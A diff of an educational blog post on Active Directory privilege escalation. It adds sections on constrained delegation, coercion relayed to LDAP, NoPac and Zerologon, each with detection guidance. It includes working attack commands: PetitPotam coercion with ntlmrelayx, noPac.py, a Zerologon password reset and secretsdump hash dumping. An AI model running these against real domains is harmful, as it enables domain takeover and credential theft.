@@ -13,7 +13,7 @@ seriesOrder: 3
 
 > **Series Focus:** Part 1 mapped the architecture. Part 2 walked through enumerating it from an ordinary authenticated user's seat, and pointed out that the ACLs and delegation flags enumeration turns up form a connected graph rather than a list of findings. This part walks that graph: the specific techniques that turn one compromised low-privilege account into Domain Admin, explained assuming no prior exposure to any of them, using the tools actually current in 2026 rather than whatever a course written five years ago still teaches.
 
-**TL;DR:** Privilege escalation in Active Directory is rarely a vulnerability, it is a series of design decisions being used exactly as designed, aimed at a target they weren't meant for. <Term concept="kerberoasting">Kerberoasting</Term> and <Term concept="asrep-roasting">AS-REP Roasting</Term> abuse Kerberos itself to get crackable material with no interaction, and <Term concept="timeroasting">Timeroasting</Term> gets the same crackable material from computer accounts through a completely different protocol, MS-SNTP, needing no credential at all. <Term concept="unconstrained-delegation">Unconstrained delegation</Term> and <Term concept="rbcd">Resource-Based Constrained Delegation</Term> abuse the mechanism built to let one service act on a user's behalf. <Term concept="dnsadmins">DnsAdmins</Term> membership, a group that sounds like DNS record delegation, actually grants a DLL-loading feature on the DNS service that turns into SYSTEM on a domain controller with one restart. <Term concept="shadow-credentials">Shadow Credentials</Term> abuses the same attribute Windows Hello for Business uses to store a passwordless credential. <Term concept="esc1">AD CS ESC1</Term> abuses a certificate template that never checked who it was actually issuing a certificate to. <Term concept="dcsync">DCSync</Term> abuses the replication protocol domain controllers use to trust each other, to walk out with the one hash, <Term concept="krbtgt">krbtgt</Term>'s, that ends the game via a <Term concept="golden-ticket">Golden Ticket</Term>. Every technique below gets the same treatment: what it actually does, a diagram where the chain has more than two steps, the current tool for it (<Term concept="rubeus">Rubeus</Term>, <Term concept="netexec">NetExec</Term>, <Term concept="certipy">Certipy</Term>), and the event ID or signal that catches it.
+**TL;DR:** Privilege escalation in Active Directory is rarely a vulnerability, it is a series of design decisions being used exactly as designed, aimed at a target they weren't meant for. <Term concept="kerberoasting">Kerberoasting</Term> and <Term concept="asrep-roasting">AS-REP Roasting</Term> abuse Kerberos itself to get crackable material with no interaction, and <Term concept="timeroasting">Timeroasting</Term> gets the same crackable material from computer accounts through a completely different protocol, MS-SNTP, needing no credential at all. <Term concept="unconstrained-delegation">Unconstrained delegation</Term>, <Term concept="constrained-delegation">Constrained Delegation</Term>, and <Term concept="rbcd">Resource-Based Constrained Delegation</Term> abuse the mechanism built to let one service act on a user's behalf, and <Term concept="coercion">coercion</Term> relayed straight to LDAP gets RBCD's outcome without needing any of the ACEs the standing version requires. <Term concept="nopac">NoPac</Term> and <Term concept="zerologon">Zerologon</Term> both reach a domain controller's own identity directly, one by chaining two validation gaps, the other by exploiting a cryptography bug that needs no credential at all. <Term concept="dnsadmins">DnsAdmins</Term> membership, a group that sounds like DNS record delegation, actually grants a DLL-loading feature on the DNS service that turns into SYSTEM on a domain controller with one restart. <Term concept="shadow-credentials">Shadow Credentials</Term> abuses the same attribute Windows Hello for Business uses to store a passwordless credential. <Term concept="esc1">AD CS ESC1</Term> abuses a certificate template that never checked who it was actually issuing a certificate to. <Term concept="dcsync">DCSync</Term> abuses the replication protocol domain controllers use to trust each other, to walk out with the one hash, <Term concept="krbtgt">krbtgt</Term>'s, that ends the game via a <Term concept="golden-ticket">Golden Ticket</Term>. Every technique below gets the same treatment: what it actually does, a diagram where the chain has more than two steps, the current tool for it (<Term concept="rubeus">Rubeus</Term>, <Term concept="netexec">NetExec</Term>, <Term concept="certipy">Certipy</Term>), and the event ID or signal that catches it.
 
 ## Introduction
 
@@ -349,6 +349,46 @@ secretsdump.py -k -no-pass $DOMAIN/$TARGET\$@$TARGET_DC -just-dc-ntlm
   <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The server never had to be privileged. It only had to be trusted for delegation, and visited once by someone who was.</p>
 </div>
 
+**<Term concept="constrained-delegation">Constrained Delegation (KCD)</Term>** sits between the two, narrower than unconstrained but administered the opposite way from RBCD: instead of the resource listing who may delegate to it, the front-end service account itself lists, in `msDS-AllowedToDelegateTo`, exactly which back-end SPNs it's allowed to reach on a user's behalf. Compromise that front-end account and, if the delegation was configured "with protocol transition" (the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag), a full S4U2Self/S4U2Proxy chain, the same two-request exchange RBCD uses, lets the attacker impersonate any non-protected user toward those specific SPNs. Nothing needs to be written anywhere first; the trust already exists, an administrator configured it.
+
+**Requirements:** control of a service account already configured for constrained delegation with protocol transition, no additional ACE or attribute write required, since the delegation itself was set up by someone else ahead of time.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram of constrained delegation abuse. A compromised service account, already listed as trusted for constrained delegation with protocol transition, runs the full S4U2Self and S4U2Proxy chain in a single request against the KDC, impersonating an administrator toward one of its pre-authorized SPNs. The KDC issues the service ticket directly, since the delegation list was configured by an administrator ahead of time and no attribute write was needed.">
+    <rect x="10" y="45" width="160" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="90" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Compromised service</text>
+    <text x="90" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">already trusted for KCD</text>
+    <rect x="480" y="45" width="150" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="555" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">KDC</text>
+    <text x="555" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">checks msDS-AllowedToDelegateTo</text>
+    <line x1="170" y1="58" x2="480" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adKcdA)" />
+    <text x="320" y="50" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">S4U2Self + S4U2Proxy, impersonating administrator</text>
+    <line x1="480" y1="82" x2="170" y2="82" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adKcdB)" />
+    <text x="320" y="100" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">service ticket to the pre-authorized SPN, issued directly</text>
+    <rect x="230" y="115" width="180" height="30" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="134" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">no attribute write, the trust already existed</text>
+    <defs>
+      <marker id="adKcdA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adKcdB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Compare this to RBCD below: same S4U mechanics, but here an administrator already did the one write step an RBCD attacker still has to do themselves.</p>
+</div>
+
+```bash
+# full S4U2Self + S4U2Proxy in one call, impersonating a target user toward the delegated SPN
+getST.py -spn cifs/target.$DOMAIN -impersonate administrator $DOMAIN/$USER:$PASSWORD
+
+# equivalent, from Windows, with Rubeus
+Rubeus.exe s4u /nowrap /msdsspn:cifs/target.$DOMAIN /impersonateuser:administrator /domain:$DOMAIN /user:$USER /password:$PASSWORD
+```
+
+If protocol transition isn't enabled ("Kerberos only" delegation), S4U2Self still returns a ticket but it won't be marked forwardable, which is exactly what S4U2Proxy requires, so the chain fails on its own. The documented way around that gap is to fall back to RBCD against the same service account, since a computer account can write its own `msDS-AllowedToActOnBehalfOfOtherIdentity`, closing the loop back to the technique below.
+
 **Resource-Based Constrained Delegation (RBCD)** is the modern, narrower replacement, and it flips who controls the trust: instead of a front-end server being globally trusted for delegation, the back-end resource itself lists exactly which accounts may delegate to it, in an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity`. That flip is exactly what makes it abusable in a different way: whoever can write that attribute on a computer object controls who gets to impersonate users against it, and writing it doesn't require domain admin, only `GenericWrite` (or equivalent) on that one computer object, an ACE that's easy to overlook. If the attacker doesn't already control a computer account to name in that attribute, <Term concept="machine-account-quota">machine account quota</Term>, ten by default for any authenticated user, lets them create one.
 
 **Requirements:** `GenericWrite` (or equivalent) on the target computer object, and control of some computer account to name as the delegate, either one already held or one created on the spot via machine account quota.
@@ -405,7 +445,54 @@ getST.py -spn cifs/targetpc.$DOMAIN -impersonate $TARGET_USER -dc-ip $DC_IP $DOM
 Rubeus.exe s4u /user:ATTACKERPC$ /rc4:$NTHASH /impersonateuser:$TARGET_USER /msdsspn:cifs/targetpc.$DOMAIN /ptt
 ```
 
-**Detection.** Unconstrained delegation abuse is best caught before it happens: alert on any change that sets `TRUSTED_FOR_DELEGATION` on a computer object (a `userAccountControl` change visible in **event 4738**, or the underlying attribute change in **event 5136**), and watch for coercion attempts, which Microsoft Defender for Identity has dedicated detections for. RBCD abuse leaves two distinct signals: a write to `msDS-AllowedToActOnBehalfOfOtherIdentity` itself (**event 5136**, if a SACL is configured on the object, since as covered in Part 1 this requires deliberate auditing setup) and, often the earlier tell, a burst of new computer account creation (**event 4741**) from a single user account exhausting or approaching its machine account quota.
+**Detection.** Unconstrained delegation abuse is best caught before it happens: alert on any change that sets `TRUSTED_FOR_DELEGATION` on a computer object (a `userAccountControl` change visible in **event 4738**, or the underlying attribute change in **event 5136**), and watch for coercion attempts, which Microsoft Defender for Identity has dedicated detections for. Constrained delegation abuse leaves the thinnest trail of the three, since nothing gets written at exploitation time at all, the delegation was already configured; the only real control is reviewing `msDS-AllowedToDelegateTo` the same way AdminSDHolder gets reviewed in Part 5, on a schedule, before an attacker finds a forgotten entry first. RBCD abuse leaves two distinct signals: a write to `msDS-AllowedToActOnBehalfOfOtherIdentity` itself (**event 5136**, if a SACL is configured on the object, since as covered in Part 1 this requires deliberate auditing setup) and, often the earlier tell, a burst of new computer account creation (**event 4741**) from a single user account exhausting or approaching its machine account quota.
+
+## RBCD Without the ACE: Coercion Relayed Straight to LDAP
+
+Every RBCD requirement above assumes the attacker already holds `GenericWrite` on some computer object. Most of the time, nobody hands that out. What actually turns RBCD into one of the most consequential AD chains in current tradecraft is that an attacker doesn't need it at all, because a computer account can always write one specific attribute about itself: `msDS-AllowedToActOnBehalfOfOtherIdentity`. Coerce that machine into authenticating somewhere the attacker controls, relay the resulting NTLM session straight to LDAP, and the relay is now speaking as the coerced machine, with exactly enough self-write rights to configure RBCD against itself, no pre-existing ACE, no foothold beyond network access to whatever RPC service the coercion primitive rides on.
+
+**Requirements:** no domain credential is strictly required for the coercion call itself on several of these primitives, and no existing ACE anywhere; the only thing that has to be reachable is the coerced machine's RPC interface and a listener the coercion target can route to.
+
+The <Term concept="coercion">coercion</Term> side has more than one primitive, and they're worth knowing as a family rather than remembering PetitPotam alone: **MS-EFSRPC** (PetitPotam), **MS-RPRN** (the printer bug, PrinterBug/SpoolSample), **MS-DFSNM** (DFSCoerce), and **MS-FSRVP** (ShadowCoerce) each expose a different RPC method that, called against a target, makes it authenticate outward to an address the caller supplies. None of them are the vulnerability by themselves, they're the trigger; what happens to the resulting authentication is what turns it into a chain.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "640px" }} role="img" aria-label="A four-step horizontal chain: the attacker coerces a machine, often a domain controller, using any RPC coercion primitive such as PetitPotam, PrinterBug, DFSCoerce, or ShadowCoerce, to authenticate to an attacker-controlled relay listener. The listener relays that NTLM authentication to LDAP on a domain controller, authenticating as the coerced machine, and uses that session's self-write rights to configure RBCD on the coerced machine's own computer object, pointing at a new attacker-controlled account. The attacker runs the S4U2Self and S4U2Proxy chain as that new account, impersonating any user toward the coerced machine. If the coerced machine is a domain controller, this reaches DCSync directly.">
+    <rect x="10" y="60" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Coerce a machine</text>
+    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">(PetitPotam / etc.)</text>
+    <rect x="180" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Relay to LDAP,</text>
+    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">write self-RBCD</text>
+    <rect x="350" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="420" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">S4U2Self /</text>
+    <text x="420" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">S4U2Proxy chain</text>
+    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.16" stroke="#ef4444" strokeWidth="1.4" />
+    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Any user, on</text>
+    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">the coerced machine</text>
+    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRelayRbcd)" />
+    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRelayRbcd)" />
+    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adRelayRbcd)" />
+    <defs>
+      <marker id="adRelayRbcd" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>If the coerced machine is a domain controller, "any user on the coerced machine" means Domain Admin against the DC's own LDAP and CIFS services, one hop from DCSync.</p>
+</div>
+
+```bash
+# start the LDAP relay listener, configured to run the full RBCD setup automatically
+ntlmrelayx.py -t ldap://$DC_IP --delegate-access
+
+# coerce a machine, here a domain controller, to authenticate back to the listener
+python3 PetitPotam.py -u $USER -p $PASSWORD -d $DOMAIN attacker-host $TARGET_DC
+
+# once ntlmrelayx reports success, run the S4U2Self/S4U2Proxy chain against the coerced machine
+getST.py -spn cifs/$TARGET_DC.$DOMAIN -impersonate administrator $DOMAIN/'RELAYEDATTACKERPC$':'Passw0rd!'
+```
+
+**Detection.** This chain lives entirely at the intersection of signals already covered separately: a coercion attempt (Microsoft Defender for Identity's dedicated coercion detections, the same ones flagged for unconstrained delegation abuse above), an LDAP bind authenticating as a machine account from an IP that isn't that machine, and the resulting write to `msDS-AllowedToActOnBehalfOfOtherIdentity` (**event 5136**, if a SACL is configured). None of the three is unique to this chain, which is exactly the point, the chain's real strength is combining ordinary-looking pieces rather than doing anything novel with any one of them.
 
 ## DnsAdmins to SYSTEM: The ServerLevelPluginDll Feature
 
@@ -557,6 +644,98 @@ certipy auth -pfx administrator.pfx -dc-ip $DC_IP
 
 **Detection.** The certificate authority's own event log (**events 4886 and 4887** on the CA server, tracking certificate requests and issuance) is the ground truth: a certificate request where the requesting principal and the Subject Alternative Name don't match, especially when the SAN belongs to a privileged account, is close to unambiguous. The proactive side matters just as much here: running `certipy find -vulnerable` against your own forest on a schedule is the AD CS equivalent of running BloodHound defensively, covered in Part 1's best practices, and catches the misconfiguration before anyone has to detect its abuse.
 
+## NoPac: Becoming the Domain Controller's Own Identity
+
+<Term concept="nopac">NoPac</Term> chains two separate 2021 CVEs into the shortest path in this entire post: any standard domain user to a domain controller's own machine account identity, in one tool invocation. Part 5's Sapphire Ticket section already cites the patch that closed this, KB5008380, three times without ever explaining what it originally fixed. This is that explanation.
+
+**CVE-2021-42278** is a validation gap in computer account renaming: AD is supposed to enforce that a computer account's `sAMAccountName` ends in `$`, but the rename operation itself doesn't re-check that constraint, so an attacker who created a computer account via machine account quota can rename it to something that collides with a real domain controller's name, minus the trailing `$`. **CVE-2021-42287** is what makes that collision dangerous: when the KDC processes a ticket request and can't find a computer account matching the exact name presented, it falls back to retrying the lookup with a `$` appended, on the theory that the client probably meant a machine account. Chain them and the KDC's fallback resolves straight to the real DC's own computer account, PAC and all.
+
+**Requirements:** a standard, unprivileged domain user account, and enough machine account quota headroom to create one computer account, ten by default per Part 2.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "640px" }} role="img" aria-label="A four-step horizontal chain for NoPac. Step one, the attacker creates a computer account using machine account quota. Step two, that account is renamed to match a domain controller's name with the trailing dollar sign stripped, exploiting CVE-2021-42278, and a TGT is requested for it while it still exists under that name. Step three, the attacker deletes the renamed account so the exact name no longer resolves. Step four, a later ticket request triggers the KDC's CVE-2021-42287 fallback, which appends a dollar sign and resolves to the real domain controller's own computer account, handing the attacker a ticket carrying that identity.">
+    <rect x="10" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="80" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Create a computer</text>
+    <text x="80" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">account (MAQ)</text>
+    <rect x="180" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="250" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Rename to DC name,</text>
+    <text x="250" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">no trailing $ (42278)</text>
+    <rect x="350" y="60" width="140" height="50" rx="7" fill="#a855f7" fillOpacity="0.12" stroke="#a855f7" strokeWidth="1.2" />
+    <text x="420" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">Delete the</text>
+    <text x="420" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">renamed account</text>
+    <rect x="520" y="60" width="110" height="50" rx="7" fill="#ef4444" fillOpacity="0.16" stroke="#ef4444" strokeWidth="1.4" />
+    <text x="575" y="82" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">KDC fallback</text>
+    <text x="575" y="95" textAnchor="middle" fill="currentColor" fontSize="9" fontWeight="bold">resolves to DC$ (42287)</text>
+    <line x1="150" y1="85" x2="180" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adNoPac)" />
+    <line x1="320" y1="85" x2="350" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adNoPac)" />
+    <line x1="490" y1="85" x2="520" y2="85" stroke="currentColor" strokeOpacity="0.5" strokeWidth="1.2" markerEnd="url(#adNoPac)" />
+    <defs>
+      <marker id="adNoPac" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.5" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>The attacker never learns any privileged credential. The ticket at the end carries the real DC's own identity because the KDC's own fallback logic put it there.</p>
+</div>
+
+```bash
+# scans for the vulnerability and, if present, runs the full chain to a shell or a dumped ticket
+python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -dc-host $TARGET_DC --impersonate administrator -use-ldap
+
+# with a shell on success, straight into DCSync using the DC's own recovered identity
+python3 noPac.py $DOMAIN/$USER:$PASSWORD -dc-ip $DC_IP -dc-host $TARGET_DC --impersonate administrator -dump
+```
+
+**Detection.** The account lifecycle is the tell: a computer account creation (**event 4741**) followed within seconds by a name change to something not ending in `$` (**event 4781**) and then a deletion (**event 4743**) is a sequence normal administration essentially never produces. Patched domain controllers (KB5008380 and later) reject the exploit outright by enforcing stricter validation at both the rename and the PAC-lookup fallback, which is the same patch Part 5's Sapphire Ticket detection depends on, closing both gaps with one update.
+
+## Zerologon: A Cryptography Bug, Not a Permission One
+
+Every technique so far in this post is a permission or a design decision aimed at a target it wasn't meant for. <Term concept="zerologon">Zerologon</Term> (CVE-2020-1472) is the one flat exception: MS-NRPC, the Netlogon Remote Procedure Call interface machines use to set up a secure channel with a domain controller, reuses a static, all-zero initialization vector in AES-CFB8 mode. A zero-filled plaintext block, encrypted under a zero IV, produces a zero-filled ciphertext block roughly one attempt in 256, and because Netlogon authentication has no limit on failed attempts, an attacker can simply try until that coincidence lands, without knowing any password at all.
+
+**Requirements:** unauthenticated network access to a domain controller's Netlogon RPC endpoint, nothing else. This is the only technique in this post that starts from literally zero credentials and zero prior enumeration.
+
+<div style={{ display: "flex", flexDirection: "column", alignItems: "center", margin: "2.5rem 0" }}>
+  <svg viewBox="0 0 640 150" style={{ width: "100%", maxWidth: "600px" }} role="img" aria-label="A diagram of the Zerologon exchange. An attacker with no credentials repeatedly sends a Netlogon secure channel setup using an all-zero client credential to a domain controller, exploiting the static zero initialization vector in AES-CFB8. Roughly one attempt in 256 succeeds, at which point the domain controller accepts the attacker as an authenticated Netlogon session spoofed as any computer account, including its own.">
+    <rect x="10" y="45" width="140" height="50" rx="7" fill="#ef4444" fillOpacity="0.1" stroke="#ef4444" strokeWidth="1.2" />
+    <text x="80" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">Attacker</text>
+    <text x="80" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">zero credentials</text>
+    <rect x="480" y="45" width="150" height="50" rx="7" fill="#0ea5e9" fillOpacity="0.12" stroke="#0ea5e9" strokeWidth="1.2" />
+    <text x="555" y="67" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">DC (Netlogon RPC)</text>
+    <text x="555" y="80" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">static zero IV, no attempt limit</text>
+    <line x1="150" y1="58" x2="480" y2="58" stroke="currentColor" strokeOpacity="0.55" strokeWidth="1.2" markerEnd="url(#adZeroA)" />
+    <text x="315" y="50" textAnchor="middle" fill="currentColor" fontSize="8" opacity="0.7">secure channel setup, all-zero client credential, repeated</text>
+    <line x1="480" y1="82" x2="150" y2="82" stroke="#ef4444" strokeOpacity="0.75" strokeWidth="1.3" markerEnd="url(#adZeroB)" />
+    <text x="315" y="100" textAnchor="middle" fill="#ef4444" fontSize="8" opacity="0.9">accepted, roughly 1 attempt in 256: authenticated as any computer account</text>
+    <rect x="230" y="115" width="180" height="30" rx="6" fill="currentColor" fillOpacity="0.06" stroke="currentColor" strokeWidth="1" strokeOpacity="0.3" strokeDasharray="4 3" />
+    <text x="320" y="134" textAnchor="middle" fill="currentColor" fontSize="8.5" fontWeight="bold">no password, no username, no prior enumeration</text>
+    <defs>
+      <marker id="adZeroA" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="currentColor" opacity="0.55" />
+      </marker>
+      <marker id="adZeroB" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+        <path d="M 0 0 L 10 5 L 0 10 z" fill="#ef4444" opacity="0.85" />
+      </marker>
+    </defs>
+  </svg>
+  <p style={{ fontSize: "0.85rem", opacity: 0.7, marginTop: "0.75rem" }}>Nothing here is a permission being misused. The math itself is broken: a zero-filled plaintext under a zero IV has a real chance of encrypting to zero, and Netlogon never penalizes a failed guess.</p>
+</div>
+
+Once the coincidence lands, the attacker holds a Netlogon session spoofed as any computer account, most usefully the domain controller's own, and can call `NetrServerPasswordSet2` to set that account's password, encrypted under the same broken mechanism, to whatever the attacker supplies, including all zero bytes. Setting a DC's own machine account password disruptively breaks its replication and SAM consistency, which is exactly why current tradecraft prefers the relay variant: instead of resetting anything, relay the spoofed Netlogon session straight into a DCSync call and let the endgame below do the rest, no disruption, no reset to walk back afterward.
+
+```bash
+# scan for the vulnerability, no credentials needed
+python3 zerologon_tester.py $TARGET_DC $DC_IP
+
+# non-disruptive: relay the spoofed Netlogon session straight into DCSync
+ntlmrelayx.py -t dcsync://$TARGET_DC_2 --no-smb-server
+
+# disruptive alternative: reset the DC's own password to empty, then restore it after
+python3 cve-2020-1472-exploit.py $TARGET_DC $DC_IP
+secretsdump.py -no-pass $DOMAIN/$TARGET_DC\$@$DC_IP -just-dc-ntlm
+```
+
+**Detection.** Patched domain controllers (August 2020 and later) enforce secure RPC for Netlogon by default and reject the vulnerable call pattern outright, making patch status the actual control here, not detection. Where patching lags, Microsoft's own guidance is to monitor **event 5829** (a vulnerable Netlogon secure channel connection allowed) on the DC, which fires specifically when an unpatched fallback path gets used, and any `NetrServerPasswordSet2` call targeting a domain controller's own account from a source that isn't that DC is close to unambiguous regardless of patch level.
+
 ## DCSync and the Golden Ticket Endgame
 
 Domain controllers trust each other with a specific replication protocol, `MS-DRSR`, running over RPC and generally referred to by its interface name, DRSUAPI. Any account holding the `Replicating Directory Changes` and `Replicating Directory Changes All` rights, ordinarily just Domain Admins, Enterprise Admins, and the DCs themselves, can bind to a DC over DRSUAPI and call `DRSGetNCChanges`, the exact RPC method real domain controllers call on each other to replicate, asking for any object's data, including password hashes, as though the requester were another domain controller. This is <Term concept="dcsync">DCSync</Term>, and the object worth asking for is always the same one: `krbtgt`, whose password hash is what encrypts and signs every Kerberos ticket in the domain.
@@ -621,7 +800,9 @@ Every technique above gets its own signal, but seeing them side by side is what 
 | AS-REP Roasting | AS-REQ for a no-preauth account, no proof of password | Event 4768 on the DC; MDI |
 | Timeroasting | MS-SNTP request for an arbitrary RID, no authentication | No dedicated audit event; monitor for weak/legacy computer passwords upstream |
 | Unconstrained delegation abuse | TRUSTED_FOR_DELEGATION set on a computer; coercion attempts | Event 4738 / 5136; MDI coercion alerts |
+| Constrained delegation (KCD) abuse | No write event at all, delegation was pre-configured | Scheduled review of msDS-AllowedToDelegateTo |
 | RBCD abuse | Write to msDS-AllowedToActOnBehalfOfOtherIdentity; computer account creation burst | Event 5136 (if SACL set); event 4741 |
+| Coercion relayed to RBCD | Coercion attempt; machine-account LDAP bind from an unexpected IP | MDI coercion alerts; event 5136 on the coerced machine's own object |
 | DnsAdmins ServerLevelPluginDll | Plugin DLL loaded from a UNC path; unscheduled DNS service restart | DNS Server event 770; event 4657 (if SACL set); event 7036 |
 | Shadow Credentials | Write to msDS-KeyCredentialLink; certificate-based AS-REQ | Event 5136 (if SACL set); event 4768 |
 | AD CS ESC1 | Certificate issued with a SAN that doesn't match the requester | CA events 4886/4887; proactive `certipy find -vulnerable` |
@@ -630,7 +811,7 @@ Every technique above gets its own signal, but seeing them side by side is what 
 
 ## Conclusion
 
-Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting and AS-REP Roasting use Kerberos exactly as specified, and Timeroasting gets the same result from a protocol, MS-SNTP, that was never asked to authenticate anything in the first place. Unconstrained delegation and RBCD use delegation exactly as designed. DnsAdmins uses a DNS server management feature exactly as documented, on a group whose name just doesn't advertise what that feature actually reaches. Shadow Credentials uses the same key-trust mechanism Windows Hello for Business relies on. ESC1 uses certificate enrollment exactly as the template configured it to work. DCSync uses the replication protocol every domain controller depends on. The common thread across all eight is that AD's permission model, or in Timeroasting's case, the complete absence of one at the protocol level, decides which of these design features an account is actually allowed to reach, and privilege escalation is what happens when that permission model has drifted from what anyone intended, which per Part 1 is the security descriptor's job in the first place. Enumeration, Part 2's subject, is how that drift gets found before an attacker finds it first, and detecting the techniques in this post, which is what most of it has been about, is the layer that catches the drift nobody found in time.
+Most of this post didn't exploit a vulnerability in the CVE sense. Kerberoasting and AS-REP Roasting use Kerberos exactly as specified, and Timeroasting gets the same result from a protocol, MS-SNTP, that was never asked to authenticate anything in the first place. Unconstrained, constrained, and resource-based delegation all use delegation exactly as designed, and relaying coercion into RBCD just automates the one write step an attacker would otherwise need an ACE for. DnsAdmins uses a DNS server management feature exactly as documented, on a group whose name just doesn't advertise what that feature actually reaches. Shadow Credentials uses the same key-trust mechanism Windows Hello for Business relies on. ESC1 uses certificate enrollment exactly as the template configured it to work. DCSync uses the replication protocol every domain controller depends on. NoPac and Zerologon are the two honest exceptions, an actual validation gap and an actual cryptography bug, patched rather than mitigated, worth knowing precisely because "patched" and "irrelevant" aren't the same claim in a domain that hasn't fully updated. The common thread across the rest is that AD's permission model, or in Timeroasting's case, the complete absence of one at the protocol level, decides which of these design features an account is actually allowed to reach, and privilege escalation is what happens when that permission model has drifted from what anyone intended, which per Part 1 is the security descriptor's job in the first place. Enumeration, Part 2's subject, is how that drift gets found before an attacker finds it first, and detecting the techniques in this post, which is what most of it has been about, is the layer that catches the drift nobody found in time.
 
 ## References & Further Reading
 
@@ -676,3 +857,25 @@ Nothing in this post exploited a vulnerability in the CVE sense. Kerberoasting a
 	The original disclosure of Timeroasting, including the MS-SNTP mechanics and the performance comparison against Kerberos TGS-REP cracking.
